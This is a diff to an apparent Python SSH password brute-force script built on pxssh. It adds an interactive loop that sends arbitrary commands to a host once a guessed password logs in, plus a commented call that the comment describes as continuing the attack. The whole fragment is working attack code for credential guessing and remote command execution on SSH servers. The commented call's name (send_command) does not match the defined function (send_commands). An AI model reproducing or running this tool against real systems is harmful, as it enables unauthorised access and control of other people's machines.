@@ -4,11 +4,19 @@ import pxssh,optparse  # pxssh module makes ssh connection process easier
 from sys import exit
 from threading import Thread
 
+def send_commands(s):
+        while True:
+                command = raw_input("Enter the command you want to execute: ")
+                s.sendline(command)
+                s.prompt()  # Tries and match the prompt
+                print s.before  # print texts before prmopt
+
 def connect(hostname,username,password):
         s = pxssh.pxssh()  # Creating a pxssh object
         try:
                 s.login(hostname,username,password)
                 print '[+]Password found: ',password
+                # send_command(s)  # YOU CALL THIS IF AFTER COMPLETITION OF ATTACK YOU WANT TO CONTINUE SENDING ATTACK
         except:
                 return
 def main():
